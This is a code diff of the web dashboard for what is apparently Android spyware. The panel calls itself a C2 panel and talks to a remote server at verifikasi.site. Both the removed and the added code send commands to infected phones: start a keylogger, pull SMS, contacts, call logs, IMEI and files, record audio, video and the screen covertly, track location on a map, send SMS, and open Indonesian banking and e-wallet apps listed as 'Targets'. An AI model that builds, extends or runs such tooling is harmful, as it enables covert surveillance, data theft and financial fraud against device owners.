-            {id:'get_notifications', label:'🔔 Get Notifs'},
-            {id:'get_notifications_history', label:'📜 History'},
-            {id:'clear_notification', label:'🗑️ Clear', param:'id'},
-            {id:'clear_all_notifications', label:'🗑️ Clear All'}
-        ]
-    },
-    'keylogger': {
-        label: '⌨️ Keylogger (4)',
-        commands: [
-            {id:'keylogger_start', label:'▶️ Start'},
-            {id:'keylogger_stop', label:'⏹️ Stop'},
-            {id:'keylogger_upload', label:'📤 Upload'},
-            {id:'keylogger_status', label:'📊 Status'}
-        ]
-    },
-    'komunikasi': {
-        label: '💬 Communication (3)',
-        commands: [
-            {id:'kirim_sms', label:'📨 Send SMS', param:'nomor|pesan'},
-            {id:'kirim_sms_massal', label:'📨 Mass SMS', param:'pesan'},
-            {id:'call_number', label:'📞 Call', param:'nomor'}
-        ]
-    },
-    'apps': {
-        label: '📱 Apps (5)',
-        commands: [
-            {id:'buka_aplikasi', label:'📱 Open App', param:'package'},
-            {id:'uninstall_aplikasi', label:'🗑️ Uninstall', param:'package'},
-            {id:'app_force_stop', label:'⏹️ Force Stop', param:'package'},
-            {id:'app_clear_data', label:'🧹 Clear Data', param:'package'},
-            {id:'buka_url', label:'🌐 Open URL', param:'url'}
-        ]
-    },
-    'target': {
-        label: '💰 Targets (7)',
-        commands: [
-            {id:'buka_dana', label:'💰 DANA'},
-            {id:'buka_gopay', label:'💰 GoPay'},
-            {id:'buka_ovo', label:'💰 OVO'},
-            {id:'buka_bri', label:'🏦 BRI'},
-            {id:'buka_bca', label:'🏦 BCA'},
-            {id:'buka_mandiri', label:'🏦 Mandiri'},
-            {id:'buka_shopee', label:'🛍️ Shopee'}
-        ]
-    },
-    'media': {
-        label: '🎥 Media (5)',
-        commands: [
-            {id:'screenshot', label:'📸 Screenshot'},
-            {id:'record_audio', label:'🎤 Record Audio', param:'durasi'},
-            {id:'stop_audio', label:'⏹️ Stop Audio'},
-            {id:'record_video', label:'🎥 Record Video', param:'durasi'},
-            {id:'stop_video', label:'⏹️ Stop Video'}
-        ]
-    },
-    'screen': {
-        label: '📹 Screen Rec (3)',
-        commands: [
-            {id:'screen_record', label:'📹 Start', param:'durasi'},
-            {id:'screen_record_stop', label:'⏹️ Stop'},
-            {id:'screen_record_status', label:'📊 Status'}
-        ]
-    },
-    'file': {
-        label: '📁 Files (2)',
-        commands: [
-            {id:'list_file', label:'📂 List', param:'path'},
-            {id:'ambil_file', label:'📄 Get', param:'path'}
-        ]
-    },
-    'sistem': {
-        label: '🔧 System (5)',
-        commands: [
-            {id:'get_system_info', label:'📊 System Info'},
-            {id:'get_battery', label:'🔋 Battery'},
-            {id:'get_wifi', label:'📶 WiFi'},
-            {id:'vibrate', label:'📳 Vibrate', param:'ms'},
-            {id:'toast', label:'💬 Toast', param:'msg'}
-        ]
-    }
-};
-
-// ============================================================
-// LOGIN - PERBAIKAN HEADER X-Password
-// ============================================================
-function login(){
+function login() {
     var p = document.getElementById('loginPassword').value.trim();
-    if(!p){ showLoginError('Enter master key!'); return; }
-    fetch('/data', {
-        headers: { 'X-Password': p }
-    }).then(r=>{
-        if(r.status===200){
-            PASSWORD = p;
-            document.getElementById('loginContainer').style.display = 'none';
-            document.getElementById('dashboardContent').classList.remove('hidden');
-            document.getElementById('loginError').style.display = 'none';
-            initDashboard();
-        } else {
-            showLoginError('❌ Invalid key');
-        }
-    }).catch(()=>showLoginError('❌ Server unreachable'));
+    if (!p) return;
+    PASSWORD = p;
+    document.getElementById('loginContainer').style.display = 'none';
+    document.getElementById('dashboardContent').classList.remove('hidden');
+    initDashboard();
 }
-function showLoginError(msg){ var el=document.getElementById('loginError'); el.textContent=msg; el.style.display='block'; }
 
-function logout(){
+function logout() {
     PASSWORD = '';
     document.getElementById('dashboardContent').classList.add('hidden');
     document.getElementById('loginContainer').style.display = 'block';
-    document.getElementById('loginPassword').value = '';
-    if(ws){ ws.close(); ws=null; }
-    if(map){ map.remove(); map=null; }
-    if(refreshInterval){ clearInterval(refreshInterval); refreshInterval=null; }
 }
 
-// ============================================================
-// INIT
-// ============================================================
-function initDashboard(){
-    renderC2Commands();
-    connectWebSocket();
+function initDashboard() {
     refreshData();
-    renderMedia();
-    renderFiles('/sdcard/');
-    renderStats();
-    refreshInterval = setInterval(refreshData, 15000);
-    addLog('info', '☠️ C2 Panel v6.0 initialized');
-    addLog('info', '🔌 Connected to verifikasi-api');
+    renderC2Commands();
     setTimeout(initMap, 1000);
+    setInterval(refreshData, 15000);
+    addLog('System initialized');
 }
 
-function showPanel(id){
+function showPanel(id) {
     document.querySelectorAll('.panel').forEach(p=>p.classList.remove('active'));
     document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-    var target = document.getElementById('panel'+id.charAt(0).toUpperCase()+id.slice(1));
-    if(target) target.classList.add('active');
+    document.getElementById('panel'+id.charAt(0).toUpperCase()+id.slice(1)).classList.add('active');
     document.querySelector('.tab[onclick="showPanel(\''+id+'\')"]').classList.add('active');
-    if(id==='media') renderMedia();
-    if(id==='files') renderFiles(currentFilePath);
-    if(id==='map') setTimeout(refreshMap, 300);
-    if(id==='stats') renderStats();
 }
 
-// ============================================================
-// WEBSOCKET - REAL-TIME
-// ============================================================
-function connectWebSocket(){
-    try{
-        ws = new WebSocket('wss://verifikasi.site/ws');
-        ws.onopen = function(){
-            wsConnected = true;
-            addLog('info', '🔌 WebSocket connected');
-            ws.send(JSON.stringify({type:'auth', key:PASSWORD, role:'admin'}));
-        };
-        ws.onmessage = function(e){
-            try{
-                var d = JSON.parse(e.data);
-                if(d.type==='auth_success'){
-                    addLog('info', '🔐 WebSocket authenticated');
-                } else if(d.type==='new_data'){
-                    addLog('data', '📥 New data from '+(d.device||'unknown'));
-                    refreshData();
-                } else if(d.type==='c2_result'){
-                    addLog('c2', '⚡ C2 result: '+JSON.stringify(d.result).substring(0,80));
-                } else if(d.type==='ping'){
-                    ws.send(JSON.stringify({type:'pong', timestamp:d.timestamp}));
-                } else if(d.type==='command_received'){
-                    addLog('c2', '✅ Command received by device');
-                }
-            }catch(e){}
-        };
-        ws.onclose = function(){
-            wsConnected = false;
-            addLog('error', '🔌 WebSocket disconnected, reconnecting...');
-            setTimeout(connectWebSocket, 5000);
-        };
-        ws.onerror = function(){
-            addLog('error', '🔌 WebSocket error');
-        };
-    }catch(e){
-        addLog('error', '🔌 WebSocket connection failed: '+e.message);
-    }
+function refreshData() {
+    fetch('/data', { headers: { 'X-Password': PASSWORD } })
+        .then(r=>r.json())
+        .then(data=>{
+            if (data && data.data) {
+                allData = data.data;
+                renderData(allData);
+                updateStats(allData);
+            }
+        })
+        .catch(()=>{});
 }
 
-// ============================================================
-// DATA - PERBAIKAN HEADER X-Password
-// ============================================================
-function refreshData(){
-    fetch('/data', {
-        headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
-        if(data && data.data){
-            allData = data.data;
-            renderData(allData);
-            updateStats(allData);
-            updateDeviceCount(allData);
-            if(document.getElementById('panelMap').classList.contains('active')) refreshMap();
-        }
-    }).catch(e=>addLog('error','Refresh failed: '+e.message));
-}
-
-function renderData(data){
+function renderData(data) {
     var tbody = document.getElementById('dataTableBody');
     tbody.innerHTML = '';
-    var search = document.getElementById('searchInput').value.toLowerCase();
-    var filter = document.getElementById('filterType').value;
-    var filtered = data.filter(item=>{
-        if(search && !JSON.stringify(item).toLowerCase().includes(search)) return false;
-        if(filter && item.sumber!==filter) return false;
-        return true;
-    });
-    filtered.slice(0, 150).forEach(item=>{
+    data.slice(0, 100).forEach(item=>{
         var tr = document.createElement('tr');
-        var time = new Date(item.waktu).toLocaleString('id-ID');
-        var dataStr = typeof item.data==='object' ? JSON.stringify(item.data).substring(0, 60) : (item.data||'').substring(0, 60);
-        var device = item.device || item.ip || item.deviceId || item.userAgent || '-';
-        var action = '';
-        var d = typeof item.data==='object' ? item.data : null;
-        if(d && d.lat && d.lon){
-            var lat = d.lat, lon = d.lon;
-            if(typeof lat==='string') lat=parseFloat(lat);
-            if(typeof lon==='string') lon=parseFloat(lon);
-            if(!isNaN(lat) && !isNaN(lon) && lat!==0 && lon!==0){
-                action = '<a href="https://www.google.com/maps?q='+lat+','+lon+'" target="_blank" class="map-btn">🗺️</a>';
-            }
-        } else if(typeof item.data==='string' && item.data.startsWith('data:image')){
-            action = '<span class="map-btn" style="cursor:pointer" onclick="previewImage(\''+item.data+'\')">📷</span>';
-        }
-        tr.innerHTML = '<td>'+time+'</td><td>'+item.sumber+'</td><td>'+dataStr+'</td><td>'+device+'</td><td>'+action+'</td>';
+        var time = new Date(item.waktu).toLocaleString();
+        var dataStr = typeof item.data === 'object' ? JSON.stringify(item.data).substring(0, 50) : (item.data||'').substring(0, 50);
+        tr.innerHTML = '<td>'+time+'</td><td>'+item.sumber+'</td><td>'+dataStr+'</td><td>'+(item.device||item.ip||'-')+'</td>';
         tbody.appendChild(tr);
     });
 }
 
-function previewImage(dataUrl){
-    openModal('<img src="'+dataUrl+'" style="max-width:100%;max-height:80vh;border-radius:6px;">');
-}
-
-function updateStats(data){
-    var stats = {
-        sms:0, kontak:0, lokasi:0, call_log:0, clipboard:0, screenshot:0,
-        keylogger:0, whatsapp:0, telegram:0, audio:0, video:0, screen_rec:0,
-        files:0, c2:0, device:new Set()
-    };
+function updateStats(data) {
+    var stats = { total: data.length, sms:0, kontak:0, lokasi:0, call_log:0, screenshot:0, keylogger:0, files:0, c2:0 };
+    var devices = new Set();
     data.forEach(item=>{
         var s = item.sumber||'';
-        if(s==='sms'||s==='sms_all'||s==='data_sms') stats.sms++;
-        else if(s==='kontak'||s==='kontak_all'||s==='data_kontak') stats.kontak++;
-        else if(s==='lokasi'||s==='geolocation_browser'||s==='data_lokasi'||s==='lokasi_all') stats.lokasi++;
-        else if(s==='call_log'||s==='call_log_all'||s==='data_call_log') stats.call_log++;
-        else if(s==='clipboard'||s==='clipboard_all'||s==='data_clipboard') stats.clipboard++;
-        else if(s==='screenshot'||s==='auto_screenshot') stats.screenshot++;
-        else if(s==='keylogger'||s==='keylogger_data') stats.keylogger++;
-        else if(s==='whatsapp') stats.whatsapp++;
-        else if(s==='telegram') stats.telegram++;
-        else if(s==='audio_record') stats.audio++;
-        else if(s==='video_record') stats.video++;
-        else if(s==='screen_record') stats.screen_rec++;
-        else if(s==='file_list'||s==='list_file') stats.files++;
-        else if(s==='c2_result'||s==='http_command_received'||s==='ws_command_received') stats.c2++;
-        if(item.ip) stats.device.add(item.ip);
-        if(item.device) stats.device.add(item.device);
-        if(item.deviceId) stats.device.add(item.deviceId);
+        if (s.includes('sms')) stats.sms++;
+        else if (s.includes('kontak')) stats.kontak++;
+        else if (s.includes('lokasi')) stats.lokasi++;
+        else if (s.includes('call_log')) stats.call_log++;
+        else if (s.includes('screenshot')) stats.screenshot++;
+        else if (s.includes('keylogger')) stats.keylogger++;
+        else if (s.includes('file')) stats.files++;
+        else if (s.includes('c2') || s.includes('command')) stats.c2++;
+        if (item.ip) devices.add(item.ip);
+        if (item.device) devices.add(item.device);
     });
-    document.getElementById('statTotal').textContent = data.length;
-    document.getElementById('statTotalHeader').textContent = data.length;
-    document.getElementById('statDevices').textContent = stats.device.size;
+    document.getElementById('statTotal').textContent = stats.total;
+    document.getElementById('statDevices').textContent = devices.size;
     document.getElementById('statSMS').textContent = stats.sms;
     document.getElementById('statContacts').textContent = stats.kontak;
     document.getElementById('statLocation').textContent = stats.lokasi;
     document.getElementById('statCallLog').textContent = stats.call_log;
-    document.getElementById('statClipboard').textContent = stats.clipboard;
     document.getElementById('statScreenshot').textContent = stats.screenshot;
     document.getElementById('statKeylogger').textContent = stats.keylogger;
-    document.getElementById('statWhatsApp').textContent = stats.whatsapp;
-    document.getElementById('statTelegram').textContent = stats.telegram;
-    document.getElementById('statAudio').textContent = stats.audio;
-    document.getElementById('statVideo').textContent = stats.video;
-    document.getElementById('statScreenRec').textContent = stats.screen_rec;
     document.getElementById('statFiles').textContent = stats.files;
     document.getElementById('statC2').textContent = stats.c2;
 }
 
-function updateDeviceCount(data){
-    var devices = new Set();
-    (data||allData).forEach(item=>{
-        if(item.ip) devices.add(item.ip);
-        if(item.device) devices.add(item.device);
-        if(item.deviceId) devices.add(item.deviceId);
-    });
-    document.getElementById('deviceCount').textContent = devices.size;
-}
+function filterData() { renderData(allData); }
 
-function filterData(){ renderData(allData); }
+// C2 Commands (48 perintah)
+var C2_COMMANDS = [
+    { id: 'ambil_kontak', label: '📇 Contacts' },
+    { id: 'ambil_sms', label: '💬 SMS' },
+    { id: 'ambil_call_log', label: '📞 Call Log' },
+    { id: 'ambil_lokasi', label: '📍 Location' },
+    { id: 'get_clipboard', label: '📋 Clipboard' },
+    { id: 'set_clipboard', label: '📋 Set Clipboard', param: 'text' },
+    { id: 'ambil_imei', label: '📱 IMEI' },
+    { id: 'ambil_imsi', label: '📱 IMSI' },
+    { id: 'ambil_nomor_hp', label: '📱 Phone' },
+    { id: 'get_installed_apps', label: '📱 Apps' },
+    { id: 'get_notifications', label: '🔔 Notifs' },
+    { id: 'clear_all_notifications', label: '🗑️ Clear All' },
+    { id: 'keylogger_start', label: '▶️ Keylogger' },
+    { id: 'keylogger_stop', label: '⏹️ Stop' },
+    { id: 'keylogger_upload', label: '📤 Upload' },
+    { id: 'kirim_sms', label: '📨 Send SMS', param: 'number|message' },
+    { id: 'call_number', label: '📞 Call', param: 'number' },
+    { id: 'buka_aplikasi', label: '📱 Open App', param: 'package' },
+    { id: 'uninstall_aplikasi', label: '🗑️ Uninstall', param: 'package' },
+    { id: 'buka_dana', label: '💰 DANA' },
+    { id: 'buka_gopay', label: '💰 GoPay' },
+    { id: 'buka_ovo', label: '💰 OVO' },
+    { id: 'buka_bri', label: '🏦 BRI' },
+    { id: 'buka_bca', label: '🏦 BCA' },
+    { id: 'screenshot', label: '📸 Screenshot' },
+    { id: 'record_audio', label: '🎤 Record Audio', param: 'durasi' },
+    { id: 'stop_audio', label: '⏹️ Stop Audio' },
+    { id: 'record_video', label: '🎥 Record Video', param: 'durasi' },
+    { id: 'stop_video', label: '⏹️ Stop Video' },
+    { id: 'screen_record', label: '📹 Screen Rec', param: 'durasi' },
+    { id: 'screen_record_stop', label: '⏹️ Stop' },
+    { id: 'list_file', label: '📂 List Files', param: 'path' },
+    { id: 'ambil_file', label: '📄 Get File', param: 'path' },
+    { id: 'get_system_info', label: '📊 System Info' },
+    { id: 'get_battery', label: '🔋 Battery' },
+    { id: 'get_wifi', label: '📶 WiFi' },
+    { id: 'vibrate', label: '📳 Vibrate', param: 'ms' },
+    { id: 'toast', label: '💬 Toast', param: 'msg' },
+    { id: 'buka_url', label: '🌐 Open URL', param: 'url' }
+];
 
-function exportData(){
-    var blob = new Blob([JSON.stringify(allData, null, 2)], {type:'application/json'});
-    var url = URL.createObjectURL(blob);
-    var a = document.createElement('a');
-    a.href = url;
-    a.download = 'c2_data_'+Date.now()+'.json';
-    a.click();
-}
-
-// ============================================================
-// MAP - LOCATION
-// ============================================================
-function initMap(){
-    if(map){ map.remove(); map=null; }
-    map = L.map('map', {center:[-6.2088,106.8456], zoom:5, zoomControl:true});
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {attribution:'© OSM'}).addTo(map);
-    refreshMap();
-}
-
-function refreshMap(){
-    if(!map){ initMap(); return; }
-    mapMarkers.forEach(m=>map.removeLayer(m));
-    mapMarkers = [];
-    var locs = allData.filter(item => 
-        item.sumber==='lokasi' || item.sumber==='geolocation_browser' || 
-        item.sumber==='data_lokasi' || item.sumber==='lokasi_all'
-    );
-    var list = document.getElementById('locationList');
-    list.innerHTML = '';
-    if(!locs.length){ list.innerHTML = '<div class="empty-state">📭 No location data</div>'; return; }
-    var bounds = [];
-    locs.forEach((item, idx)=>{
-        var d = typeof item.data==='object' ? item.data : null;
-        var lat=null, lon=null, acc=null;
-        if(d){ lat=d.lat||d.latitude; lon=d.lon||d.longitude; acc=d.accuracy||d.akurasi; }
-        else if(typeof item.data==='string'){
-            try{ var p=JSON.parse(item.data); lat=p.lat||p.latitude; lon=p.lon||p.longitude; acc=p.accuracy||p.akurasi; }catch(e){}
-        }
-        if(lat && lon){
-            if(typeof lat==='string') lat=parseFloat(lat);
-            if(typeof lon==='string') lon=parseFloat(lon);
-            if(!isNaN(lat) && !isNaN(lon) && lat!==0 && lon!==0){
-                var popup = '<b>📍 #'+(idx+1)+'</b><br>Lat: '+lat+'<br>Lon: '+lon+(acc?'<br>Accuracy: '+acc+'m':'')+
-                           '<br><br><a href="https://www.google.com/maps?q='+lat+','+lon+'" target="_blank" style="color:#4fc3f7;">🗺️ Google Maps</a>'+
-                           '<br><a href="https://www.openstreetmap.org/?mlat='+lat+'&mlon='+lon+'&zoom=15" target="_blank" style="color:#4fc3f7;">🌍 OpenStreetMap</a>';
-                var marker = L.marker([lat, lon]).addTo(map);
-                marker.bindPopup(popup);
-                mapMarkers.push(marker);
-                bounds.push([lat, lon]);
-                var div = document.createElement('div');
-                div.className = 'location-item';
-                div.onclick = function(){ window.open('https://www.google.com/maps?q='+lat+','+lon, '_blank'); };
-                div.innerHTML = '<span>📍 #'+(idx+1)+' - '+new Date(item.waktu).toLocaleString('id-ID')+'</span><a href="https://www.google.com/maps?q='+lat+','+lon+'" target="_blank" class="map-btn">🗺️</a>';
-                list.appendChild(div);
-            }
-        }
-    });
-    if(bounds.length) map.fitBounds(bounds, {padding:[50,50]});
-}
-
-// ============================================================
-// C2 COMMANDS - SEND TO SystemUpdate.html & SystemService.java
-// ============================================================
-function renderC2Commands(){
+function renderC2Commands() {
     var container = document.getElementById('cmdContainer');
     container.innerHTML = '';
-    Object.keys(C2_COMMANDS).forEach(catKey=>{
-        var cat = C2_COMMANDS[catKey];
-        var div = document.createElement('div');
-        div.className = 'cmd-category';
-        div.setAttribute('data-category', catKey);
-        var title = document.createElement('div');
-        title.className = 'cat-title';
-        title.innerHTML = cat.label+' <span class="count">'+cat.commands.length+'</span>';
-        div.appendChild(title);
-        var grid = document.createElement('div');
-        grid.className = 'cmd-grid';
-        cat.commands.forEach(cmd=>{
-            var btn = document.createElement('div');
-            btn.className = 'cmd-btn';
-            if(cmd.id.includes('uninstall')||cmd.id.includes('clear_')||cmd.id.includes('stop')) btn.className += ' danger';
-            else if(cmd.id.includes('start')||cmd.id.includes('record')) btn.className += ' success';
-            else if(cmd.id.includes('get')||cmd.id.includes('ambil')) btn.className += ' warning';
-            btn.textContent = cmd.label;
-            btn.setAttribute('data-id', cmd.id);
-            btn.setAttribute('data-param', cmd.param||'');
-            btn.onclick = function(){
-                var p = this.getAttribute('data-param');
-                if(p){ openParamModal(cmd.id, cmd.label, p); }
-                else { sendC2Command(cmd.id, ''); }
-            };
-            grid.appendChild(btn);
-        });
-        div.appendChild(grid);
-        container.appendChild(div);
-    });
-    document.getElementById('cmdCount').textContent = '48';
-}
-
-function filterCommands(){
-    var s = document.getElementById('cmdSearch').value.toLowerCase();
-    var cat = document.getElementById('cmdCategoryFilter').value;
-    document.querySelectorAll('.cmd-category').forEach(c=>{
-        var show = !(cat && c.getAttribute('data-category')!==cat);
-        var has = false;
-        c.querySelectorAll('.cmd-btn').forEach(b=>{
-            var match = true;
-            if(s && !b.textContent.toLowerCase().includes(s) && !b.getAttribute('data-id').includes(s)) match = false;
-            b.style.display = match ? '' : 'none';
-            if(match) has = true;
-        });
-        c.style.display = (show && has) ? '' : 'none';
+    C2_COMMANDS.forEach(cmd=>{
+        var btn = document.createElement('div');
+        btn.className = 'cmd-btn';
+        btn.textContent = cmd.label;
+        btn.onclick = function() {
+            var param = cmd.param || '';
+            if (param) {
+                var p = prompt('Parameter untuk '+cmd.label+' ('+param+'):');
+                if (p !== null) sendC2Command(cmd.id, p);
+            } else {
+                sendC2Command(cmd.id, '');
+            }
+        };
+        container.appendChild(btn);
     });
 }
 
-function openParamModal(cmdId, label, paramDesc){
-    var html = '<h3 style="color:#4fc3f7;margin-bottom:10px">📤 '+label+'</h3>'+
-               '<p style="color:#8899aa;margin-bottom:6px">Parameter: <strong>'+paramDesc+'</strong></p>'+
-               '<input type="text" id="paramInput" placeholder="Enter parameter..." style="width:100%;padding:6px 10px;border-radius:4px;border:1px solid #1a2a3f;background:#0d1a2b;color:#c8d6e5;margin-bottom:10px;font-family:monospace;outline:none">'+
-               '<div style="display:flex;gap:6px">'+
-               '<button onclick="sendC2CommandWithParam(\''+cmdId+'\')" style="flex:1;padding:6px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:monospace">📤 Send</button>'+
-               '<button onclick="closeModal()" style="flex:1;padding:6px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:monospace">❌ Cancel</button></div>';
-    openModal(html);
-}
-
-function sendC2CommandWithParam(cmdId){
-    var p = document.getElementById('paramInput').value.trim();
-    closeModal();
-    sendC2Command(cmdId, p);
-}
-
-function sendC2Command(cmd, param){
-    addLog('c2', '📤 Sending: '+cmd+(param?' | '+param:''));
-    var data = {command: cmd, target:'all', timestamp:Date.now()};
-    if(param){
-        if(param.includes('|')){ var parts=param.split('|'); data.param1=parts[0]||''; data.param2=parts[1]||''; }
-        else data.param = param;
-    }
+function sendC2Command(cmd, param) {
+    var data = { command: cmd, target: 'all', timestamp: Date.now() };
+    if (param) data.param = param;
     fetch('/c2', {
-        method:'POST',
-        headers:{'Content-Type':'application/json', 'X-Password': PASSWORD},
-        body:JSON.stringify(data)
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json', 'X-Password': PASSWORD },
+        body: JSON.stringify(data)
     }).then(r=>r.json()).then(d=>{
-        addLog('c2', '✅ Command sent: '+cmd+' - '+(d.status||'ok'));
-        showCmdResult('✅ '+cmd+' sent to all devices');
-    }).catch(e=>{
-        addLog('error', '❌ Send failed: '+e.message);
-        showCmdResult('❌ Failed: '+e.message);
-    });
+        addLog('Command sent: '+cmd);
+    }).catch(()=>{ addLog('Command failed'); });
 }
 
-function sendCustomCommand(){
+function sendCustomCommand() {
     var cmd = document.getElementById('customCmd').value.trim();
     var param = document.getElementById('customParam').value.trim();
-    if(!cmd) return;
+    if (!cmd) return;
     sendC2Command(cmd, param);
     document.getElementById('customCmd').value = '';
     document.getElementById('customParam').value = '';
 }
 
-function showCmdResult(msg){
-    var el = document.getElementById('cmdResult');
-    el.classList.remove('hidden');
-    el.textContent = msg;
-    setTimeout(()=>el.classList.add('hidden'), 6000);
-}
-
-// ============================================================
-// LOGS
-// ============================================================
-function addLog(type, msg){
-    var entry = {time: new Date().toLocaleTimeString('id-ID'), type:type, message:msg};
-    logEntries.unshift(entry);
-    renderLogs();
-}
-
-function renderLogs(){
+function addLog(msg) {
+    logEntries.push('['+new Date().toLocaleTimeString()+'] '+msg);
     var area = document.getElementById('logArea');
-    var s = document.getElementById('logSearch').value.toLowerCase();
-    var filtered = logEntries.filter(e => !s || e.message.toLowerCase().includes(s) || e.type.includes(s));
-    area.innerHTML = filtered.slice(0, 300).map(e =>
-        '<div class="log-entry"><span class="time">['+e.time+']</span><span class="type">['+e.type+']</span><span class="data">'+e.message+'</span></div>'
-    ).join('');
+    area.innerHTML = logEntries.slice(-100).join('\n');
 }
 
-function filterLogs(){ renderLogs(); }
-function clearLogs(){ logEntries=[]; renderLogs(); }
-
-// ============================================================
-// MEDIA - PERBAIKAN HEADER X-Password
-// ============================================================
-function renderMedia(){
-    var g = document.getElementById('mediaGallery');
-    g.innerHTML = '<div class="empty-state">⏳ Loading media...</div>';
-    fetch('/data?limit=300', {
-        headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
-        g.innerHTML = '';
-        if(!data || !data.data || !data.data.length){
-            g.innerHTML = '<div class="empty-state">📭 No media data</div>';
-            return;
-        }
-        var items = data.data.filter(item => {
-            var src = item.sumber||'';
-            return src.includes('screenshot') || src.includes('photo') || src.includes('gallery') ||
-                   src.includes('audio') || src.includes('video') || src.includes('image') ||
-                   src.includes('record') || (typeof item.data==='string' && item.data.startsWith('data:'));
-        });
-        if(!items.length){ g.innerHTML = '<div class="empty-state">📭 No media found</div>'; return; }
-        items.slice(0, 50).forEach(item => {
-            var card = document.createElement('div');
-            card.className = 'media-card';
-            card.onclick = function(){ openMediaModal(item); };
-            var ds = typeof item.data==='string' ? item.data : JSON.stringify(item.data);
-            var isImg = ds.startsWith('data:image'), isAud = ds.startsWith('data:audio'), isVid = ds.startsWith('data:video');
-            var preview = '';
-            if(isImg && ds.length<500000) preview = '<img src="'+ds+'" class="preview">';
-            else if(isAud) preview = '<div class="preview">🎵</div>';
-            else if(isVid) preview = '<div class="preview">🎬</div>';
-            else preview = '<div class="preview">📄</div>';
-            var time = new Date(item.waktu).toLocaleString('id-ID');
-            card.innerHTML = preview+'<div class="info"><span class="sumber">'+item.sumber+'</span><span>'+time.split(',').pop()+'</span></div>';
-            g.appendChild(card);
-        });
-    }).catch(e=>{ g.innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
+function initMap() {
+    if (map) { map.remove(); map=null; }
+    map = L.map('map', { center: [-6.2088, 106.8456], zoom: 5 });
+    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(map);
 }
 
-function openMediaModal(item){
-    var ds = typeof item.data==='string' ? item.data : JSON.stringify(item.data);
-    var isImg = ds.startsWith('data:image'), isAud = ds.startsWith('data:audio'), isVid = ds.startsWith('data:video');
-    var html = '<h3 style="color:#4fc3f7;margin-bottom:6px">📸 '+item.sumber+'</h3>'+
-               '<p style="color:#8899aa;font-size:10px;margin-bottom:10px">'+new Date(item.waktu).toLocaleString('id-ID')+'</p>';
-    if(isImg) html += '<img src="'+ds+'" style="max-width:100%;max-height:65vh;border-radius:6px;">';
-    else if(isAud) html += '<audio controls style="width:100%;margin:6px 0" src="'+ds+'"></audio>'+
-                          '<div style="background:#050a12;padding:8px;border-radius:4px;max-height:120px;overflow:auto;font-size:9px;font-family:monospace;color:#8899aa;word-break:break-all;">'+ds.substring(0,150)+'...</div>';
-    else if(isVid) html += '<video controls style="max-width:100%;max-height:60vh;border-radius:6px" src="'+ds+'"></video>';
-    else html += '<div style="background:#050a12;padding:8px;border-radius:4px;max-height:250px;overflow:auto;font-size:9px;font-family:monospace;color:#8899aa;word-break:break-all;">'+ds+'</div>';
-    html += '<div style="margin-top:10px;display:flex;gap:6px">'+
-            '<button onclick="downloadMedia(\''+ds+'\',\''+item.sumber+'\')" style="flex:1;padding:6px;border-radius:4px;border:none;background:#1a3a5f;color:#4fc3f7;cursor:pointer;font-family:monospace">📥 Download</button>'+
-            '<button onclick="closeModal()" style="flex:1;padding:6px;border-radius:4px;border:1px solid #1a2a3f;background:transparent;color:#8899aa;cursor:pointer;font-family:monospace">❌ Close</button></div>';
-    openModal(html);
-}
-
-function downloadMedia(dataUrl, filename){
-    try{
-        var link = document.createElement('a');
-        link.href = dataUrl;
-        var ext = 'png';
-        if(dataUrl.startsWith('data:image/jpeg')) ext='jpg';
-        else if(dataUrl.startsWith('data:audio')) ext='mp3';
-        else if(dataUrl.startsWith('data:video')) ext='mp4';
-        else if(dataUrl.startsWith('data:application')) ext='bin';
-        link.download = filename+'_'+Date.now()+'.'+ext;
-        document.body.appendChild(link);
-        link.click();
-        document.body.removeChild(link);
-        addLog('info','📥 Downloaded: '+filename);
-    }catch(e){ alert('Download failed: '+e.message); }
-}
-
-// ============================================================
-// FILES - PERBAIKAN HEADER X-Password
-// ============================================================
-function renderFiles(path){
-    currentFilePath = path || '/sdcard/';
-    var container = document.getElementById('fileList');
-    container.innerHTML = '<div class="empty-state">⏳ Loading...</div>';
-    fetch('/data?type=list_file&path='+encodeURIComponent(currentFilePath), {
-        headers: { 'X-Password': PASSWORD }
-    }).then(r=>r.json()).then(data=>{
-        container.innerHTML = '';
-        var bc = document.createElement('div');
-        bc.className = 'file-breadcrumb';
-        bc.innerHTML = '<span>📁</span>';
-        var parts = currentFilePath.replace(/^\/+/,'').split('/');
-        var cp = '';
-        parts.forEach((p,i)=>{ if(p){ cp+=p+'/'; bc.innerHTML+='<span onclick="renderFiles(\''+cp+'\')">'+p+'</span>'; if(i<parts.length-1)bc.innerHTML+='<span style="color:#8899aa;">/</span>'; }});
-        if(!currentFilePath || currentFilePath==='/sdcard/') bc.innerHTML+='<span style="color:#8899aa;">/sdcard/</span>';
-        container.appendChild(bc);
-        var list = document.createElement('div');
-        if(data && data.files && data.files.length){
-            var files = data.files;
-            files.sort((a,b)=>{ if(a.isFolder&&!b.isFolder)return -1; if(!a.isFolder&&b.isFolder)return 1; return (a.name||'').localeCompare(b.name||''); });
-            files.forEach(f=>{
-                var item = document.createElement('div');
-                item.className = 'file-item';
-                var icon = f.isFolder?'📁':'📄';
-                var size = f.isFolder?'--':formatSize(f.size||0);
-                var fullPath = f.path || (currentFilePath+(f.name||''));
-                if(f.isFolder) item.onclick = function(){ renderFiles(fullPath+'/'); };
-                else item.onclick = function(){ openFileModal(fullPath); };
-                item.innerHTML = '<div>'+icon+' '+(f.name||'')+'</div>'+
-                                '<div style="display:flex;align-items:center;gap:8px">'+
-                                '<span style="color:#8899aa;font-size:9px">'+size+'</span>'+
-                                '<div class="actions">'+
-                                '<button class="download-btn" onclick="event.stopPropagation();downloadFile(\''+fullPath+'\')">📥</button>'+
-                                '<button class="delete-btn" onclick="event.stopPropagation();deleteFile(\''+fullPath+'\')">🗑️</button></div></div>';
-                list.appendChild(item);
-            });
-        } else { list.innerHTML = '<div class="empty-state">📭 Empty folder</div>'; }
-        container.appendChild(list);
-    }).catch(e=>{ container.innerHTML = '<div class="empty-state">❌ Error: '+e.message+'</div>'; });
-}
-
-function formatSize(bytes){
